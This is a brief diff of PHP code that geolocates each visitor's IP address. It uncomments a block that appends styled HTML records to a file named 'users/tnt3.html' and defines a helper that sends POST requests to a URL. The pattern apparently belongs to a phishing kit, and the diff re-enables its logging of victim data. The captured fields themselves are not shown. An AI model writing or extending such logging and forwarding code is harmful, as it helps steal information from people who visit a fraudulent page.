@@ -78,7 +78,7 @@ function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
 
 $CountryA = ip_info($_SERVER['REMOTE_ADDR'],'Country');
 
-/*
+
 $content = "<pre style='border: 2px solid; border-color: rgb(67, 159, 253);border-radius: 4px;font-weight: bold;font-size: 14px;padding-top: 1.5%;padding-bottom: 2%;'>
   <img src='https://2.bp.blogspot.com/-O-ZJASC706s/U_hvz20oD2I/AAAAAAAAACw/OV1BlsEyjM0/s1600/logo_106x27.png'/>
 
@@ -112,7 +112,7 @@ $f = fopen("../../users/tnt3.html", "a");
 fwrite($f, $content);
 		
 fclose($f);
-*/
+
 
 //----------------send request post to url ----------------
 function sendPost($url,$data) {
